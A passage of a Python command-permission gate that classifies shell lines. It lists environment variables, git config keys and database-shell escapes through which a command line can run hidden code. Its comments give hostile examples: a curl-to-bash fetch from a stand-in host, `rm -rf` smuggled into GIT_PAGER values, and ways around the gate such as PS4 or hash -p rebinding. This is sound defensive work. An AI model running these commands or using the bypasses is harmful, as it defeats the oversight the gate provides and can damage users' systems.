GIT_SSH_COMMAND GIT_SSH GIT_PAGER GIT_EDITOR GIT_SEQUENCE_EDITOR GIT_EXTERNAL_DIFF GIT_ASKPASS SSH_ASKPASS
RSYNC_RSH PAGER MANPAGER EDITOR VISUAL LESSOPEN LESSCLOSE GIT_PROXY_COMMAND BROWSER GH_PAGER GH_EDITOR GH_BROWSER
PSQL_PAGER PSQL_EDITOR SUDO_ASKPASS SUDO_EDITOR RSYNC_CONNECT_PROG PROMPT_COMMAND PS4
""".split())
# PS4 is not a command line but a prompt bash expands before every traced command (`set -x`), interactive or not:
# its `$( )` and backticks run. Its value is read as that double-quoted text (_prompt_text).
# _EXEC_ENV_OPAQUE: the value is not a command the gate can read but decides what code runs: options the
# program parses, libraries the loader injects, or where programs, modules, startup and config files are
# found (HOME picks ~/.gitconfig, ~/.ssh/config and ~/.exo), and CDPATH, which moves a relative `cd` where
# the gate cannot tell whether later writes land in the Exo store. Opaque, named. An empty CDPATH turns
# it off (`CDPATH= cd src`). Left out: IFS, which does not change how literal words split (expansions are
# opaque already). LESS counts only with a `+` command in it (`LESS=-R` stays allow).
_EXEC_ENV_OPAQUE = {
    **dict.fromkeys("TAR_OPTIONS NODE_OPTIONS PERL5OPT RUBYOPT MANOPT ZIPOPT".split(),
                    "sets options the gate does not read"),
    "RIPGREP_CONFIG_PATH": "points rg at a config file the gate does not read",
    **dict.fromkeys("""LD_PRELOAD LD_AUDIT LD_LIBRARY_PATH GCONV_PATH DYLD_INSERT_LIBRARIES DYLD_LIBRARY_PATH
        DYLD_FRAMEWORK_PATH DYLD_FALLBACK_LIBRARY_PATH DYLD_FALLBACK_FRAMEWORK_PATH OPENSSL_CONF OPENSSL_ENGINES
        OPENSSL_MODULES""".split(), "changes which libraries are loaded"),
    **dict.fromkeys("""PATH HOME XDG_CONFIG_HOME BASH_ENV ENV ZDOTDIR GIT_EXEC_PATH GIT_TEMPLATE_DIR
        GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM PYTHONSTARTUP PYTHONPATH PYTHONHOME PYTHONUSERBASE PERL5LIB PERLLIB
        RUBYLIB NODE_PATH PSQLRC""".split(), "changes which programs, modules or startup and config files are used"),
    "CDPATH": "moves cd, so the gate cannot tell whether writes land in the Exo store",
    "BASH_CMDS": "rebinds a program name to another file, as hash -p does",
    "BASH_ALIASES": "defines an alias",
    "GIT_ALLOW_PROTOCOL": "lets git use transports such as ext::, whose URL is a command git runs",
}
# git config from the environment, `git -c` by another name: GIT_CONFIG_KEY_<n> with GIT_CONFIG_VALUE_<n>
# (GIT_CONFIG_COUNT alone sets nothing), and GIT_CONFIG_PARAMETERS. The pairs take _git_config_kind.
_GIT_CONFIG_ENV = re.compile(r"GIT_CONFIG_(KEY|VALUE)_(\d+)")
_EXPORTERS = ("export", "declare", "typeset", "readonly", "local")


# Values of a listed variable that change nothing the gate relies on, so everyday lines keep their class: an empty
# loader variable (the loader skips it), git's global or system config pointed at /dev/null (nothing is read), an
# empty CDPATH (it turns CDPATH off), and a PATH made of the current one and folders the gate already trusts a
# program from by path (_trusted_path: a system bin folder, a virtualenv's or node_modules/.bin). An empty element
# is the current folder, so `PATH= ls` and `PATH=$PATH: ls` still ask; so does any other folder, appended or not,
# since it supplies every program the earlier ones lack, and a folder written with `..`, which the system resolves
# through links (`/tmp/s/../../usr/bin`). `$PATH` is the current value only where bash expands it: in single quotes,
# `$'..'` or after a backslash it is a folder named `$PATH` (`literal`: the assignment holds such text).
_EMPTY_IS_UNSET = frozenset("""LD_PRELOAD LD_AUDIT LD_LIBRARY_PATH GCONV_PATH DYLD_INSERT_LIBRARIES DYLD_LIBRARY_PATH
    DYLD_FRAMEWORK_PATH DYLD_FALLBACK_LIBRARY_PATH DYLD_FALLBACK_FRAMEWORK_PATH CDPATH""".split())


def _harmless_value(name: str, value: str | None, literal: bool = False) -> bool:
    if value is None:
        return False
    if name in _EMPTY_IS_UNSET:
        return value == ""
    if name in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM"):
        return value == "/dev/null"
    return name == "PATH" and all(not literal and d in ("$PATH", "${PATH}") or d and not re.search(r"[*?\[]", d)
                                  and ".." not in d.split("/") and (
        os.path.normpath(_expand_text(d)) in _SYSTEM_BIN or bool(_ENV_BIN.search(d.rstrip("/") + "/x")))
        for d in value.split(":"))


def _kept_text(raw: str) -> bool:
    """The source text of an assignment holds text bash keeps as written: single quotes, `$'..'` or a backslash
    (or no source text at all, which counts the same)."""
    return not raw or "'" in raw or "\\" in raw


def _env_hazard(name: str, value: str | None = None, literal: bool = False) -> str:
    """Why setting this variable matters to the gate ("" when it does not). `value` None means the line
    sets it to a value the gate does not see (`read`, `printf -v`, a for loop, a nameref). `literal`: the
    assignment's source holds quoted or escaped text (_kept_text)."""
    if name == "PS4":
        return "is expanded, $( ) included, before each traced command"
    if name in _EXEC_ENV:
        return "holds a command a program runs"
    if name in _EXEC_ENV_OPAQUE and not _harmless_value(name, value, literal):
        return _EXEC_ENV_OPAQUE[name]
    if name == "LESS" and (value is None or "+" in value):
        return "sets a command less runs at start"
    if name == "GIT_CONFIG_PARAMETERS" or _GIT_CONFIG_ENV.fullmatch(name):
        return "sets git config"
    return ""


# A variable the gate assigns without a plain NAME=value word. Parameter expansion assigns with `:=` or
# `=` (not `:-`/`-`, which only substitute); arithmetic (`$((NAME=n))`) and an array subscript (`a[NAME=n]`,
# itself arithmetic) assign an integer; a `{NAME}>` redirection drops the fd number into NAME. Each sets the
# variable as a side effect, whatever the program is, so a listed variable set this way must be read too.
# Only what bash expands counts: the ${..} and $((..)) the lexer met outside single quotes (_Word.exps), each
# read to the } bash closes it with and with quoted text blanked (_dollar_brace), and a bracket only as the
# subscript of a name (`echo [HOME=x]` is a glob, `'${PATH:=.}'` and `${a:-'${PATH:=.}'}` are text).
_PARAM_NAME = re.compile(r"\$\{([A-Za-z_]\w*)")            # then a subscript, and `:=` or `=` to assign
_ARITH_SET = re.compile(r"\b([A-Za-z_]\w*)\s*(?:(?:<<|>>|[-+*/%&|^])?=(?!=)|\+\+|--)|(?:\+\+|--)\s*([A-Za-z_]\w*)")
_SUBSCRIPT = re.compile(r"[A-Za-z_]\w*\[([^\]]*)\]")
_EXP_SUBSCRIPT = re.compile(r"\$\{[#!]?[A-Za-z_]\w*\[")
_FD_VAR = re.compile(r"\{([A-Za-z_]\w*)\}")
_LONG_VALUE = 64   # a nested ${..} longer than this stands in a value as `${_}`, so no text is copied twice


def _pairs(text: str, opener: str, closer: str) -> dict[int, int]:
    """Each `opener` in text: the index of the `closer` that matches it, as bash counts them (len(text) if none).
    One stack pass, so a long run of unclosed openers stays linear."""
    out, stack = {}, []
    for m in re.finditer(re.escape(opener) + "|" + re.escape(closer), text):
        if m.group() == opener:
            stack.append(m.start())
        elif stack:
            out[stack.pop()] = m.start()
    out.update(dict.fromkeys(stack, len(text)))
    return out


def _spans(text: str) -> tuple[list[tuple[int, int]], list[tuple[int, int]]]:
    """(arithmetic bodies, expansion subscripts) in `text` as (start, end): the body of each `$(( ))` not inside
    another, and the subscript of each `${a[`, `${#a[` or `${!a[` to its matching `]`; arithmetic, where a bare
    `NAME=n` assigns."""
    parens, brackets = _pairs(text, "(", ")"), _pairs(text, "[", "]")
    arith, i = [], 0
    while (j := text.find("$((", i)) >= 0:
        end = parens[j + 1] if parens[j + 1] < len(text) else len(text) - 1
        arith.append((j + 3, end))
        i = max(end, j + 3)
    return arith, [(m.end(), brackets[m.end() - 1]) for m in _EXP_SUBSCRIPT.finditer(text)]


def _covered(spans: list[tuple[int, int]]) -> list[tuple[int, int]]:
    """The spans merged into disjoint ones, in order."""
    out: list[tuple[int, int]] = []
    for a, b in sorted(spans):
        if out and a <= out[-1][1]:
            out[-1] = (out[-1][0], max(out[-1][1], b))
        else:
            out.append((a, b))
    return out


def _brace_value(src: str, frames: dict, at: int, start: int) -> str:
    """The text of the `${` at `at` from `start` to its close, with each nested ${..} longer than _LONG_VALUE as
    `${_}`: each character is copied into one value at most, however deep the nesting."""
    pieces, pos = [], start
    for child in frames[at][2]:
        end = frames[child][0]
        if end < pos:
            continue
        pieces += [src[pos:child]] if child >= pos else []
        pieces.append(src[child:end + 1] if child >= pos and end + 1 - child <= _LONG_VALUE else "${_}")
        pos = end + 1
    return "".join(pieces) + src[pos:frames[at][0]]


def _unquote_value(v: str) -> str:
    """The value a parameter-expansion assignment gives, quotes removed as bash removes them, so a command
    value (`${GIT_PAGER:='rm -rf x'}`, `${GIT_SSH_COMMAND:=rm' -rf x'}`) reads as the command it is."""
    return re.sub(r"'([^']*)'|\"([^\"]*)\"|\\(.)", lambda m: "".join(g or "" for g in m.groups()), v)


def _prompt_text(value: str) -> str:
    """A PS4 value as the command line that expands it the way bash does (`: "<value>"`), or "" when nothing in it
    runs. Backslashes are dropped first: bash decodes the prompt's own escapes (`\\$` is `$`) before it expands."""
    if "$" not in value and "`" not in value:
        return ""
    return ': "' + value.replace("\\", "").replace('"', '\\"') + '"'


def _subscript_sets(name: str) -> list[str]:
    """The variables assigned inside the subscript of a `NAME[...]` word (`a[PATH=10]` sets PATH)."""
    m = _SUBSCRIPT.match(name)
    return [a.group(1) or a.group(2) for a in _ARITH_SET.finditer(m.group(1))] if m else []


def _hidden_sets(k: "_Cmd", names: list[str]) -> list[tuple[str, str | None, bool]]:
    """(name, value, literal) for each variable the command assigns without a plain NAME=value word, each once.
    value is None when the gate does not see it (an fd number, an arithmetic result); literal: the value's source
    holds quoted or escaped text (_kept_text). Covers parameter-expansion
    assignment, arithmetic, a subscript in an expansion (`${a[PATH=10]}`, also `${a[PATH=${i}]}`) or in
    `names` (the words bash reads as a variable name: assignments, exporter and unset arguments), and a
    `{NAME}>` redirection. Linear in the line: brackets, parens and braces are each matched in one pass."""
    out: list[tuple[str, str | None, bool]] = []
    for w in [*k.words, *(t for _, t in k.redirs), *k.herestrings]:
        for vis, src, frames in w.exps:                   # only real expansions, quoted text blanked in vis
            if frames is None:                            # a $((..)): its ${..} as the lexer reads one
                frames = _dollar_brace(src, 0)[2]
            frames = {at: [end, up, []] for at, (end, up) in frames.items()}
            for at, (_, up, _) in frames.items():         # in order of start, so each child list is too
                if up in frames:
                    frames[up][2].append(at)
            brackets, asked, close_at = _pairs(vis, "[", "]"), 0, -1
            for m in _PARAM_NAME.finditer(vis):
                pos = m.end()
                if vis.startswith("[", pos):              # a subscript: PATH[0] is PATH
                    pos = brackets[pos] + 1
                op = 2 if vis.startswith(":=", pos) else 1 if vis.startswith("=", pos) else 0
                if not op:
                    continue
                if m.start() not in frames:               # not a ${ the scan opened: up to the next }
                    if not asked <= pos <= close_at:      # the last answer holds while pos stays before it
                        asked, close_at = pos, src.find("}", pos)
                        close_at = len(src) if close_at < 0 else close_at
                    frames[m.start()] = [close_at, None, []]
                raw = _brace_value(src, frames, m.start(), pos + op)
                out.append((m.group(1), _unquote_value(raw), "'" in raw or "\\" in raw))
            arith, subs = _spans(vis)
            for region in (arith, subs):
                for a, b in _covered(region):
                    out += [(m.group(1) or m.group(2), None, False) for m in _ARITH_SET.finditer(vis, a, b)]
    out += [(n, None, False) for name in names for n in _subscript_sets(name)]
    if k.redirs:                                          # `{NAME}>file`: the fd number goes into NAME
        out += [(fm.group(1), None, False) for w in k.words if not w.quoted and (fm := _FD_VAR.fullmatch(w.text))]
    return list(dict.fromkeys(out))


def _unreadable_name(w: "_Word") -> bool:
    """The variable name in this word is one the gate cannot resolve: a glob the shell expands before the
    builtin sees it (`PAT?=.`, `read HOM[E]`), or a name spliced from an expansion (`export $X=...`)."""
    if w.glob:
        return True
    name = re.split(r"\[|\+?=", w.text, maxsplit=1)[0]
    return w.dynamic and bool(re.search(r"[$`]", name))


# sqlite3/duckdb dot-commands (any unambiguous prefix works, so match prefixes): .shell and .system run a
# command, .once/.output/.import/.read run one when an argument starts with `|` (after options too:
# `.import --csv '|cmd' t`), .once/.output/.read/.load otherwise use a file or library the gate does not see
# (.import FILE is a plain data load). psql runs `\!`, and `\o`, `\out`, `\g`, `\gx`, `\w`, `\write` with a
# `|command` (also quoted, or after `\g (options)`), wherever they appear on a line; mysql runs `\!` and, at the
# start of one, `system` (psql has no `system`: a line starting `system` is SQL there). Line starts are matched
# with `[ \t]*`, not `\s*`, so a long heredoc stays linear.
_DOT_RUN, _DOT_PIPE = ("shell", "system"), ("once", "output", "import", "read")
_DOT_FILE = ("once", "output", "read", "load")
_DOT_COMMAND = re.compile(r"^[ \t]*\.([a-z]+)[ \t]*([^\n]*)", re.M)
_DOT_PIPE_ARG = re.compile(r"""(?:^|[ \t])(?:(['"])\|(.*?)\1|\|(.*))""", re.S)
_SQL_SHELL = {"mysql": re.compile(r"(?:^[ \t]*system[ \t]+|\\![ \t]*)([^\n]*)", re.M | re.I),
              "psql": re.compile(r"\\![ \t]*([^\n]*)")}
# The pipe after `\o`, `\g (options)`... is found in one pass over these tokens, so many on one line stay linear.
_SQL_PIPE = re.compile(r"\\(?:o|out|w|write|gx?)(?![a-z])|[|\n]", re.I)
# psql runs backquoted text in a meta-command's arguments (`\set x `cmd``, `\echo `cmd``)
_PSQL_META = re.compile(r"\\[a-z][^\n]*", re.I)
_SQL_PROGRAM = re.compile(r"\bprogram\s+(?:E?'|\$\w*\$)", re.I)
# database shells -> the options whose value is command text (dot-commands or SQL)
_SQL_COMMAND_OPTS = {"sqlite3": ("-cmd",), "duckdb": ("-cmd",), "psql": ("-c", "--command"),
                     "mysql": ("-e", "--execute")}
_GIT_SUBS = frozenset("""
add commit checkout switch branch merge rebase stash tag fetch pull push status log diff show reset restore
clean rm mv init clone remote config rev-parse blame ls-files grep cherry-pick revert worktree submodule
describe shortlog reflog bisect apply am format-patch archive gc fsck notes rev-list cat-file for-each-ref
symbolic-ref update-ref ls-remote ls-tree show-ref version help range-diff whatchanged sparse-checkout
maintenance count-objects verify-commit verify-tag merge-base name-rev check-ignore check-attr var
""".split())
_GIT_EXEC_KEY = re.compile(r"^(alias\..+|core\.(pager|editor|sshcommand|hookspath|fsmonitor|askpass|gitproxy)|"
                           r"sequence\.editor|diff\.external|interactive\.difffilter|.+\.[\w-]*(command|cmd)|"
                           r".+\.(textconv|clean|smudge|process|driver|program|helper)|credential\..*|pager\..+|"
                           r"filter\..+|uploadpack\..+|remote\..+\.(uploadpack|receivepack)|"
                           r"(difftool|mergetool|man|browser)\..+\.path)$", re.I)
# git config keys that load more config or a template the gate does not read: an included file can set any
# exec key, and the hooks in a template run (init.templateDir is git clone --template by another name).
_GIT_LOAD_KEY = re.compile(r"^(include\.path|includeif\..+\.path|init\.templatedir)$", re.I)
# git config that lets git reach a remote through `ext::`, whose URL is a command git runs: the switches that
# allow the transport (it is off by default), a URL rewrite to an ext:: base, and a remote whose URL is one.
_GIT_EXT_ALLOW = re.compile(r"^protocol\.(ext\.)?allow$", re.I)
_GIT_EXT_URL_KEY = re.compile(r"^(url\.ext::.*\.(push)?insteadof|remote\..+\.(push)?url)$", re.I | re.S)
_GH_GROUPS = frozenset("""
pr issue repo api auth release gist workflow run label secret variable ssh-key gpg-key search browse status
project cache ruleset org config attestation completion discussion help version --version --help
""".split())
_DATA_FLAGS = ("-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form",
               "--json", "-T", "--upload-file", "--form-string", "--data-ascii", "--expand-data")
# #208: where a post's text comes from somewhere the line does not show. gh builds the body itself (--fill, a
# template, the editor, generated notes); the HTTP clients read a file, stdin or a config file.
_GH_UNSEEN_FLAGS = {
    ("pr", "create"): ("-f", "--fill", "--fill-first", "--fill-verbose", "-e", "--editor", "-T", "--template",
                       "--recover", "--attach"),
    ("issue", "create"): ("-e", "--editor", "-T", "--template", "--recover", "--attach"),
    ("pr", "comment"): ("-e", "--editor", "--attach"), ("issue", "comment"): ("-e", "--editor", "--attach"),
    ("pr", "edit"): ("--attach",), ("issue", "edit"): ("--attach",),
    ("release", "create"): ("--generate-notes", "--notes-from-tag"), ("release", "edit"): ("--generate-notes",),
}
# gh's options that take a value, per command (gh 2.102 `--help`; `-R`/`--repo` is inherited), so the gate reads
# a line as gh does: in `gh issue create -t -b -b x` the title is `-b` and the body `x` (#208).
_GH_TAKES = {
    ("pr", "create"): ("aBbFHlmprTtR", "--assignee --attach --base --head --label --milestone --project --recover "
                                       "--reviewer --template --repo"),
    ("pr", "comment"): ("bFR", "--attach --repo"), ("pr", "review"): ("bFR", "--repo"),
    ("pr", "close"): ("cR", "--comment --repo"), ("pr", "reopen"): ("cR", "--comment --repo"),
    ("pr", "merge"): ("AbFtR", "--author-email --body --body-file --match-head-commit --subject --repo"),
    ("pr", "edit"): ("BbFmtR", "--add-assignee --add-label --add-project --add-reviewer --attach --base --milestone "
                               "--remove-assignee --remove-label --remove-project --remove-reviewer --repo"),
    ("issue", "create"): ("abFlmpTtR", "--assignee --attach --blocked-by --blocking --label --milestone --parent "
                                       "--project --recover --template --type --repo"),
    ("issue", "comment"): ("bFR", "--attach --repo"),
    ("issue", "close"): ("cR", "--comment --reason --repo"), ("issue", "reopen"): ("cR", "--comment --repo"),
    ("issue", "edit"): ("bFmtR", "--add-assignee --add-blocked-by --add-blocking --add-label --add-project "
                                 "--add-sub-issue --attach --milestone --parent --remove-assignee --remove-blocked-by "
                                 "--remove-blocking --remove-label --remove-project --remove-sub-issue --type --repo"),
    ("release", "create"): ("nFtR", "--discussion-category --notes-start-tag --target --repo"),
    ("release", "edit"): ("nFtR", "--discussion-category --tag --target --repo"),
}
_GH_API_FIELDS = ("-f", "--raw-field", "-F", "--field")
_GH_API_TAKES = "FHqXpft"      # gh api's short options that take a value
# Option values that are not the request body, so a variable there (a token in a header) leaves it readable.
_HTTP_META = {"curl": ("-H", "--header", "-u", "--user", "-A", "--user-agent", "--oauth2-bearer"),
              "wget": ("--header", "--user", "--password", "--http-user", "--http-password"),
              "http": ("-a", "--auth"), "https": ("-a", "--auth"), "xh": ("-a", "--auth"), "httpie": ("-a", "--auth")}
_SQL_DESTRUCTIVE = re.compile(r"\b(drop\s+(table|database|schema|trigger|view|index)|truncate\s+|delete\s+from)\b",
                              re.I)
_URL = re.compile(r"https?://[^\s'\"<>]+")
_GH_URL = re.compile(r"https?://github\.com/([\w.-]+/[\w.-]+)(?:/(?:pull|issues|discussions)/(\d+))?")


def _opt(argv: list[str], *names: str) -> str | None:
    """Value of the first matching option: `--body x`, `--body=x`, `-b x`, `-bx` (short only)."""
    for i, a in enumerate(argv):
        for n in names:
            if a == n and i + 1 < len(argv):
                return argv[i + 1]
            if n.startswith("--") and a.startswith(n + "="):
                return a[len(n) + 1:]
            if len(n) == 2 and not n.startswith("--") and a.startswith(n) and len(a) > 2 and not a.startswith("--"):
                return a[2:]
    return None


def _opts(argv: list[str], *names: str) -> list[str]:
    out = []
    for i, a in enumerate(argv):
        for n in names:
            if a == n and i + 1 < len(argv):
                out.append(argv[i + 1])
            elif n.startswith("--") and a.startswith(n + "="):
                out.append(a[len(n) + 1:])
    return out


def _has(argv: list[str], *flags: str) -> bool:
    for a in argv:
        if a in flags:
            return True
        # combined short flags like -rf
        if re.fullmatch(r"-[A-Za-z]{2,}", a):
            if any(len(f) == 2 and f[0] == "-" and f[1] in a[1:] for f in flags):
                return True
    return False


def _hash_rebind(words: list) -> tuple[str, str] | None:
    """What a `hash` call rebinds, as (card text, target), or None when it binds nothing (#330). `hash -p PATH NAME`
    makes the shell run PATH for every later NAME, so a file planted by an earlier write runs under a trusted
    program's name. Options are read as bash reads them: up to the first operand or `--`, `-p` in a cluster (`-rp`,
    `-dp`) or with its path attached (`-p/tmp/x`), and more options after the path (the last `-p` wins). Nothing is
    bound with no path, an empty one, or no name but those with a slash, which bash skips. Before a `-p`, a word the
    gate cannot read (an expansion, a brace set, a glob) may hold one, unless it is a lone double-quoted word at
    the end (`hash "$cmd"`), which is one word with no name after it."""
    args, path, i = words[1:], None, 0
    while i < len(args):
        w, a = args[i], args[i].text
        if path is None and (w.dynamic or w.glob or w.brace) and not (
                i + 1 == len(args) and re.fullmatch(r'"[^"@]*"', w.raw)):
            return f"hash may rebind a program name: an option word the gate cannot read ({a[:40]})", a
        if a == "--":
            i += 1
            break
        if len(a) < 2 or not a.startswith("-"):
            break
        j = a.find("p")
        if j > 0 and j + 1 == len(a):      # -p with its path in the next word
            if i + 1 == len(args):
                return None                # no path: bash stops with a usage error
            i, path = i + 1, args[i + 1].text
        elif j > 0:
            path = a[j + 1:]
        i += 1
    names = [w.text for w in args[i:] if "/" not in w.text]
    return (f"hash -p makes {', '.join(names)} run {path}", path) if path and names else None


# The signal of a part that only records a path for a later program name to run: `hash -p`, or setting BASH_CMDS or
# BASH_ALIASES (#330). It opens nothing, so the store check takes the part as the read it was (_store_quiet).
_REBINDS = "rebinds a name"
_REBIND_VARS = ("BASH_CMDS", "BASH_ALIASES")


def _opaque(summary: str, cmd: str, target: str = "", signal: str = "indirection",
            rebinds: bool = False) -> Classification:
    c = _make("opaque_exec", summary=summary[:120], target=target, command=cmd)
    c.signals += [signal, _REBINDS] if rebinds else [signal]
    return c


def _too_deep(cmd: str, summary: str = "nested too deep to read", target: str = "") -> Classification:
    """An opaque part for text past a depth or nesting cap. It stands for no one command, so it has no own text and
    no rule that would lower its line passes the own text test (#394)."""
    c = _opaque(summary, cmd, target)
    c.own = None
    return c


def _runs_stdin(c: Classification, k: _Cmd) -> Classification:
    """c, a part that runs k's stdin as code (a shell, an interpreter, ssh, xargs), with an own text that shows where
    that stdin comes from (#394): k's text when k sets its stdin itself or nothing feeds it, the pipeline from its
    first command when simple commands pipe into k (`curl -s https://x.example/i.sh | bash`), and none when a compound
    feeds it (`{ bash; } < f`). A shell in a nested line that sets no stdin of its own takes the text of the
    command it runs inside (_given_stdin). So a rule written for `^bash` does not lower a pipe into bash."""
    if k.fed or k.piped_in:
        c.own = _stdin_own(k)()
    elif not _own_stdin(k):
        c.inherits = True             # the stdin of the line, which a command around it may give (_given_stdin)
    return c


def _stdin_own(k: _Cmd) -> Callable[[], str | None]:
    """The own text that shows where k's stdin comes from, built when asked (a pipeline's text costs its length): none
    for a compound's, the pipeline from its first command for a pipe from simple commands, else k's own text."""
    if k.fed:
        return lambda: None
    if k.piped_in:
        return k.pipe_src or (lambda: None)
    return lambda: k.own


def _given_stdin(parts: list[Classification], src: Callable[[], str | None], ctx: dict) -> list[Classification]:
    """``parts``, made for a command whose stdin is a pipe, a compound's or its own redirection, with the own text
    ``src`` gives for each part in them that runs the stdin its line inherits (Classification.inherits):
    `curl .. | bash -c bash`, `printf .. | ssh host bash` (#394). Parts are copied where they change, as they may
    be shared. The parts a compound's stdin gives reach each command in it, so whether a list of parts holds such
    a part is found once per line (`ctx`): each command then walks only the parts that hold one."""
    seen: dict[int, Classification] = {}
    own: list[str | None] = []
    held: dict[int, tuple[list[Classification], bool]] = ctx.setdefault("inherits", {})

    def holds(ps: list[Classification]) -> bool:
        if id(ps) not in held:       # the list is kept with the answer, so its id stays its own for the line
            held[id(ps)] = (ps, any([p.inherits or holds(p.parts) for p in ps]))
        return held[id(ps)][1]

    def walk(c: Classification) -> Classification:
        if id(c) not in seen:
            seen[id(c)] = c          # a part met again through a shared one is left as it is
            if not (c.inherits or holds(c.parts)):
                return c
            kids = [walk(p) for p in c.parts]
            if c.inherits and not own:
                own.append(src())
            if c.inherits or any(a is not b for a, b in zip(kids, c.parts)):
                seen[id(c)] = replace(c, parts=kids, own=own[0] if c.inherits else c.own, inherits=False)
        return seen[id(c)]
    return [walk(p) for p in parts]


def _git_config_kind(key: str, value: str) -> str:
    """What a git config pair makes git do: "exec" for an exec key (an alias, the pager, the editor,
    core.sshCommand, a hook path, a filter, any key whose last part ends in `command` or `cmd`...) or a
    `!shell` value, "load" for a key that loads another config file or a template, "ext" for one that lets
    git run an `ext::` URL, "" otherwise. One check for `git -c`, `git config`, `git clone --config` and the
    GIT_CONFIG_* variables."""
    if _GIT_EXEC_KEY.match(key) or value.startswith("!"):
        return "exec"
    if _GIT_LOAD_KEY.match(key):
        return "load"
    m = _GIT_EXT_URL_KEY.match(key)
    ext = _GIT_EXT_ALLOW.match(key) or m and (m.group(1).lower().startswith("url.") or
                                              value.lower().startswith("ext::"))
    return "ext" if ext else ""


_GIT_CONFIG_DOES = {"exec": "runs a configured command", "load": "loads a config file or template the gate does not read",
                    "ext": "lets git run the command in an ext:: URL"}
# `git config` (old and new forms): the subcommands, and git's long options (git 2.54 `git config -h` and each
# subcommand's), those that take a value marked with `=`. git takes any unique prefix of a long option
# (`--fil`, `--ty`, `--rename-sec`) and `--no-` before the ones that take a value; `-f` and `-t` take one too.
_GIT_CONFIG_SUBS = frozenset("list get set unset rename-section remove-section edit".split())
_GIT_CONFIG_LONGS = tuple("""all append blob= comment= default= fixed-value global includes local name-only regexp
    show-names show-origin show-scope system url= value= worktree add bool bool-or-int bool-or-str expiry-date get
    get-all get-color get-colorbool get-regexp get-urlmatch int path remove-section rename-section replace-all unset
    unset-all edit file= list type= null""".split())


def _git_config_long(word: str) -> tuple[str, bool]:
    """A `--option[=value]` word as git config reads it: (the option's full name, "" when git rejects it as
    unknown or ambiguous, and whether it takes the next word as its value)."""
    body, eq, _ = word[2:].partition("=")
    for neg in ("", "no-"):
        if neg and not body.startswith(neg):
            continue
        part = body[len(neg):]
        names = [o for o in _GIT_CONFIG_LONGS if o.rstrip("=") == part] or \
            [o for o in _GIT_CONFIG_LONGS if o.startswith(part) and not (neg and not o.endswith("="))]
        if len(names) == 1:
            name = names[0]
            return neg + name.rstrip("="), name.endswith("=") and not neg and not eq
    return "", False


def _git_config_args(rest: list[str]) -> tuple[str, list[str]]:
    """`git config`'s words after `config` as git reads them: (the subcommand, or the old form's mode option
    without its dashes, "" for none; the names and values left). The values of `-f`, `-t`, `--file`, `--type`,
    `--default` and the like, also abbreviated, are skipped, so neither they nor `set` is read as the key."""
    mode, pos, i = "", [], 0
    while i < len(rest):
        a, i = rest[i], i + 1
        if a == "--":
            pos += rest[i:]
            break
        if a.startswith("--"):
            name, takes = _git_config_long(a)
            i += takes
            if name in ("add", "replace-all", "get", "get-all", "get-regexp", "get-urlmatch", "unset", "unset-all",
                        "rename-section", "remove-section", "list", "edit", "get-color", "get-colorbool"):
                mode = mode or name
        elif a.startswith("-") and len(a) > 1:          # -f FILE, -tTYPE, -l, -e, -z, clustered
            for n, ch in enumerate(a[1:], 2):
                if ch in "ft":                          # takes the rest of the word, or the next word
                    i += 0 if a[n:] else 1
                    break
                mode = mode or {"l": "list", "e": "edit"}.get(ch, "")
        elif not mode and not pos and a in _GIT_CONFIG_SUBS:
            mode = a
        else:
            pos.append(a)
    return mode, pos


def _git_config_sets(rest: list[str]) -> list[str]:
    """The KEY=VALUE pairs `git config ...` writes (`set`, `--add`, `--replace-all`, or a name and a value)."""
    mode, pos = _git_config_args(rest)
    return [f"{pos[0]}={pos[1]}"] if mode in ("", "set", "add", "replace-all") and len(pos) > 1 else []


def _git_config_env(spec: str) -> str:
    """`--config-env=KEY=ENVVAR` as the `-c KEY=VALUE` it is: the value comes from a variable the gate
    does not see. git splits at the last `=`."""
    key, _, var = spec.rpartition("=")
    return f"{key}=${{{var}}}"


def _git_subcommand(argv: list[str], config: list[str] | None = None) -> int:
    """Index of the git subcommand after the global options; `-c`/`--config-env` values go to `config`."""
    i = 1
    while i < len(argv) and argv[i].startswith("-"):
        if argv[i].startswith("--config-env="):
            if config is not None:
                config.append(_git_config_env(argv[i].split("=", 1)[1]))
            i += 1
            continue
        if argv[i] in ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"):
            if argv[i] in ("-c", "--config-env") and i + 1 < len(argv) and config is not None:
                config.append(argv[i + 1] if argv[i] == "-c" else _git_config_env(argv[i + 1]))
            i += 2
            continue
        i += 1
    return i


def _classify_git(argv: list[str], cmd: str) -> Classification:
    """git's own category, from its subcommand. Config set on the line (`git -c`, `--config-env`) does not replace it
    (#335): _exec_options adds a part for each such pair, so the line asks and a deny on push, force_push or delete
    still fires. Only an unknown subcommand, which that config may define, is opaque here."""
    config: list[str] = []
    i = _git_subcommand(argv, config)
    sub, rest = (argv[i] if i < len(argv) else ""), argv[i + 1:]
    if sub and sub not in _GIT_SUBS:
        for kv in config:
            k, _, v = kv.partition("=")
            if kind := _git_config_kind(k, v):
                return _opaque(f"git -c {k} {_GIT_CONFIG_DOES[kind]}"[:120], cmd)
        return _opaque(f"git {sub} (an alias or extension the gate cannot see)", cmd)
    if sub == "config":
        mode, names = _git_config_args(rest)
        if mode == "rename-section" and len(names) > 1:   # moves every key of a section under a new name
            return _opaque(f"git config renames a section to {names[1]}, which can make its keys run a command"[:120],
                           cmd)
        for kv in _git_config_sets(rest) or ([f"{names[0]}="] if names and mode in ("add", "replace-all") else []):
            k, _, v = kv.partition("=")
            if kind := _git_config_kind(k, v):        # the write stays a part, so a deny on local_write fires
                return _combine([_opaque(f"git config sets {k}, which {_GIT_CONFIG_DOES[kind]}"[:120], cmd),
                                 _make("local_write", summary="git config", command=cmd)], cmd)
    if sub == "push":
        remote = next((a for a in rest if not a.startswith("-")), "")
        if _has(rest, "-f", "--force", "--force-with-lease", "--force-if-includes", "--mirror") or \
                any(a.startswith(("+", "--force-with-lease=")) for a in rest):
            return _make("force_push", summary=f"force-push to {remote or 'remote'}", target=remote, command=cmd)
        if _has(rest, "-d", "--delete") or any(a.startswith(":") and len(a) > 1 for a in rest):
            return _make("delete", exposure="internal", summary=f"delete remote branch on {remote or 'remote'}",
                         target=remote, command=cmd)
        return _make("vcs_push", summary=f"git push to {remote or 'remote'}", target=remote, command=cmd)
    if sub == "reset" and "--hard" in rest:
        return _make("history_rewrite", summary="git reset --hard", command=cmd)
